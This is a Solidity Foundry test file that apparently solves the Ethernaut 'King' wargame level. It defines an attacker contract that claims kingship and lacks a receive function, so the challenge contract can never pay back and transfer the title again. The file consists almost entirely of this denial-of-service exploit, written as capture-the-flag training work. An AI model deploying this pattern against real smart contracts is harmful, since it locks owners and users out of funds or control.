// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

contract KingAttacker {
  address internal challengeAddress;

  constructor(address _challengeAddress) payable {
    challengeAddress = _challengeAddress;
  }

  function attack() external {
    (bool result,) = challengeAddress.call{value: 0.001 ether}("");
    result;
  }

  // this contract does not have a receive function,
  // preventing the owner of the contract to take over kingship back.
}

contract KingTest is Test {
  address internal challengeAddress;
  KingAttacker internal attackerContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x725595BA16E76ED1F6cC1e1b65A88365cC494824, 0.001 ether);
    attackerContract = new KingAttacker{value: 0.001 ether}(challengeAddress);
  }

  function testExploit() public {
    attackerContract.attack();

    utils.submitLevelInstance(challengeAddress);
  }
}
